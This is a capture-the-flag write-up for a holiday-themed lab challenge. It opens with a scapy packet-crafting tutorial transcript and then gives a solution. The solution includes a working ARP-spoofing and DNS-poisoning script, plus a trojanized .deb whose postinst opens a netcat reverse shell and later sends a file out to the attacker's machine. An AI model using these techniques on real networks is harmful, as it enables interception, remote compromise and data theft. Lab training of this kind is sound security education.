>>> task.get()
Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing present packets for shipment.
Start by running the task.submit() function passing in a string argument of 'start'.
Type task.help() for help on this question.
>>> task.submit('start')
Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted()

Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
>>> task.submit(send)
Correct! The "send" scapy class will send a crafted scapy packet out of a network interface.

Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.

>>> task.submit(sniff)
Correct! the "sniff" scapy class will sniff network traffic and return these packets in a list.

Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
3. pkt = sendp(IP(dst="127.0.0.1")/TCP(dport=20))
>>> task.submit(1)
Correct! sr1 will send a packet, then immediately sniff for a response packet.

Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.
>>> task.submit(rdpcap)
Correct! the "rdpcap" scapy class can read pcap files.

The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:
1. UDP_PACKETS.print()
2. UDP_PACKETS.show()
3. UDP_PACKETS.list()
>>> task.submit(2)
Correct! .show() can be used on lists of packets AND on an individual packet.

Submit only the first packet found in UDP_PACKETS.
>>> task.submit(UDP_PACKETS[0])
Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0.

Submit only the entire TCP layer of the second packet in TCP_PACKETS.
>>> task.submit(TCP_PACKETS[1][TCP])
Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP]

Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet
>>> task.submit(Ether(dst='00:c0:9f:32:41:8c', src='00:e0:18:b1:0c:ad', type='IPv4') / IP (version='4', ihl='5', tos='0x0', len='60', id='0', flags='DF', frag='0', ttl='64', proto='udp', chksum='0x6543', src='127.0.0.1', dst='192.168.170.20') / UDP(sport='32795', dport='domain', len='40', chksum='0xaf61') / DNS(id='30144', qr='0', opcode='QUERY', aa='0', tc='0', rd='1', ra='0', z='0', ad='0', cd='0', rcode='ok', qdcount='1', ancount='0', nscount='0', arcount='0', qd=DNSQR(qname='www.elves.rule.', qtype='A', qclass='IN'), an='None', ns='None', ar='None'))
Correct! You can change ALL scapy packet attributes using this method.

Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.
>>> TCP_PACKETS[7].payload
<IP  version=4 ihl=5 tos=0x0 len=70 id=10595 flags=DF frag=0 ttl=128 proto=tcp chksum=0x4ecb src=192.168.0.193 dst=192.168.0.114 |<TCP  sport=ftp dport=1137 seq=3334930821 ack=3753095961 dataofs=5 reserved=0 flags=PA window=65509 chksum=0xd3 urgptr=0 |<Raw  load='230 User alabaster logged in.\r' |>>>
>>> TCP_PACKETS[6][Raw]
<Raw  load='PASS echo\r\n' |>

>>> TCP_PACKETS[5][Raw]
<Raw  load='331 Password required for alabaster.\r' |>

>>> TCP_PACKETS[4][Raw]
<Raw  load='USER alabaster\r' |>

>>> TCP_PACKETS[3][Raw]
<Raw  load='220 North Pole FTP Server\r\n' |>

>>> task.submit('echo')
Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:
[pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]
The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.

>>> task.submit(ICMP_PACKETS[1][ICMP].chksum)
Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .

Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"
1. pkt = Ether(src='127.0.0.1')/ICMP(type="echo-request")
2. pkt = IP(src='127.0.0.1')/ICMP(type="echo-reply")
3. pkt = IP(dst='127.0.0.1')/ICMP(type="echo-request")
>>> task.submit(3)
Correct! Once you assign the packet to a variable named "pkt" you can then use that variable to send or manipulate your created packet.

Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)
>>> task.submit(IP(dst='127.127.127.127')/UDP(dport=5000))
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
task.submit(pkt)

Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of "elveslove.santa". (all other packet attributes can be unspecified)
>>> task.submit(IP (dst='127.2.3.4') / UDP(dport=53) / DNS(qd=DNSQR(qname='elveslove.santa')))
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.2.3.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="elveslove.santa"))
task.submit(pkt)

The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

>>> ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba'

>>> ARP_PACKETS[1][ARP].hwdst='00:16:ce:6e:8b:24'

>>> ARP_PACKETS[1][ARP].op='is-at'
>>> task.submit(ARP_PACKETS)
Great, you prepared all the present packets!

Congratulations, all pretty present packets properly prepared for processing!
```

## 9.2. Hints
> **Embedy** - Alabaster Snowball: *“The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file”*  
> **Spoofy** - Alabaster Snowball: *“The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.”*  
> **Resolvy** - Alabaster Snowball: *“Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.”*  
> **Sniffy** - Alabaster Snowball: *“Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.”*

## 9.3. Solution
For the ARP spoofing and DNS poisoning part I merged the suggested scripts into one and ensure it would manage all incoming ARP & DNS packets so to be consistent over time:
```python
from scapy.all import *
import netifaces as ni
import uuid

ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_packets(packet):
   if ARP in packet and packet[ARP].op == 1:
      ether_resp = Ether(dst=packet[Ether].src, type=0x806, src=macaddr)
      arp_response = ARP(pdst=packet[ARP].pdst)
      arp_response.op = 2
      arp_response.plen = 4
      arp_response.hwlen = 6
      arp_response.ptype = 0x0800
      arp_response.hwtype = 1
      arp_response.hwsrc = macaddr
      arp_response.psrc = packet[ARP].pdst
      arp_response.hwdst = packet[ARP].hwsrc
      arp_response.pdst = packet[ARP].psrc
      response = ether_resp/arp_response
      sendp(response, iface="eth0")
   elif DNS in packet and packet[DNS].opcode == 0:
      ether_resp = Ether(dst=packet[Ether].src, type="IPv4", src=macaddr)
      ip_resp = IP(proto="udp", src=packet[IP].dst, dst=packet[IP].src)
      udp_resp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
      dns_response=packet[DNS]
      dns_response.qr=1
      dns_response.ancount=1
      dns_response.an=DNSRR(rrname=packet[DNS].qd.qname, type='A', rclass='IN', rdata=ipaddr)
      response = ether_resp/ip_resp/udp_resp/dns_response
      sendp(response, iface="eth0")
      
while 1:
   sniff(prn=handle_packets, store=0)
```
I kept the script running with the below shell command:
```bash
guest@3944f7bc1eff:~/debs/work$ python3 sol.py>/dev/null &
```
I then ran the HTTP server with `python -m http.server 80` but I was getting permission denied errors sometimes, when it worked I could noticed incoming GET requests for `/pub/jfrost/backdoor/suriv_amd64.deb`:
```bash
guest@3944f7bc1eff:~/debs/work$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.6.6.35 - - [29/Dec/2020 00:20:08] code 404, message File not found
10.6.6.35 - - [29/Dec/2020 00:20:08] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
```
Knowing the URL of the file being requested I repackaged one of the deb file in the debs folder making it establish a reverse shell to the machine I was using:
```bash
guest@3944f7bc1eff:~/debs$ dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb netcat
guest@3944f7bc1eff:~/debs/netcat/DEBIAN$ cat control 
Package:suriv
Version:1.0
Architecture:amd64
Maintainer:anche-no
Description:ma-anche-no
guest@3944f7bc1eff:~/debs/netcat/DEBIAN$ cat postinst 
nc -e /bin/sh 10.6.0.2 4242
guest@3944f7bc1eff:~/debs$ chmod 775 netcat/DEBIAN/postinst 
guest@3944f7bc1eff:~/debs$ dpkg --build netcat
dpkg-deb: building package 'suriv' in 'netcat.deb'.
guest@3944f7bc1eff:~/debs$ mv netcat.deb suriv_amd64.deb
Rerunning the web server with a proper directory structure did the trick and I was able to establish the connection to the remote end, getting to know more the target file:
guest@3944f7bc1eff:~/debs$ mkdir -p ~/web/pub/jfrost/backdoor/
guest@3944f7bc1eff:~/debs$ cp suriv_amd64.deb ~/web/pub/jfrost/backdoor/
guest@3944f7bc1eff:~/web$ python3 -m http.server 80 2> /dev/null 1 > /dev/null &
guest@3944f7bc1eff:~/web$ nc -l -v -p 4242
listening on [any] 4242 ...
connect to [10.6.0.2] from arp_requester.guestnet0.kringlecastle.com [10.6.6.35] 52832

```
I then changed the tampered deb file and made it copy out the file to the machine i was using with netcat:
```bash
guest@3944f7bc1eff:~/debs/netcat/DEBIAN$ cat postinst 
nc -w 3 10.6.0.2 4242 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
```
Once the remote end reconnected i got the target file:
```bash
guest@3944f7bc1eff:~$ nc -l -p 4242 > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
```
Reading through the file pointed out that Tanta Kringle recused herself from the vote.

## 9.4. Special thanks
Thanks to the partly-uuid bud on Discord who had the patience to make me notice there was a readme file which I completely overlooked. Shame on me for not being able to start the web server at the first shot 😁
